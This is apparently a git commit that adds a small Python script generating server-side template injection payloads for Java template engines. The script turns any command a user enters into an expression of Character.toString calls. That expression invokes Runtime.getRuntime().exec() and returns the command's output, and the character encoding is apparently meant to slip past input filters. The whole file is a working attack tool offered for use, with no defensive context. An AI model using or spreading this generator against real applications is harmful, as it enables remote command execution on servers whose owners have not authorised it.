59501550a4fa206313b7335223a6afece3e430a5
Andrey <34392986+TrueBad0ur@users.noreply.github.com>
2022-10-26 09:19:41 +0300

    Add files via upload

---
+++ ssti_java_template_generator.py
@@ -0,0 +1,15 @@
+
+user_input = input("Enter string: ")
+
+first_byte = user_input[0]
+last_byte = user_input[len(user_input) - 1]
+
+payload = ""
+payload += "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(" + str(ord(first_byte)) + ")"
+
+for i in range(1, len(user_input)):
+	payload += ".concat(T(java.lang.Character).toString(" + str(ord(user_input[i])) + "))"
+
+payload += ").getInputStream())}"
+
+print(payload)
